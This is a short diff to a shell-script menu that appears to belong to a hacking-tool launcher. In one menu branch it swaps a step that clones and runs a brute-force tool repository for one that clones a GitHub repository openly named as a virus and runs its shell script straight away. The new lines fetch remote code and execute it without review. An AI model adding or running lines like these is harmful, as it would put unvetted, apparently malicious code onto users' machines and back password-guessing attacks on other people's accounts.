@@ -104,9 +104,9 @@ then
 clear
 figlet -f slant "W A I T"|lolcat
 sleep 1
-git clone https://github.com/FR13ND8/BRUTEFORCEnew
-cd BRUTEFORCEnew
-sh new.sh
+git clone https://github.com/hacker-ali-17/Virus.Palestinian.Algerian.git
+cd Virus.Palestinian.Algerian
+sh Algerian.sh
 fi
 
 if [ $pil = 7 ]
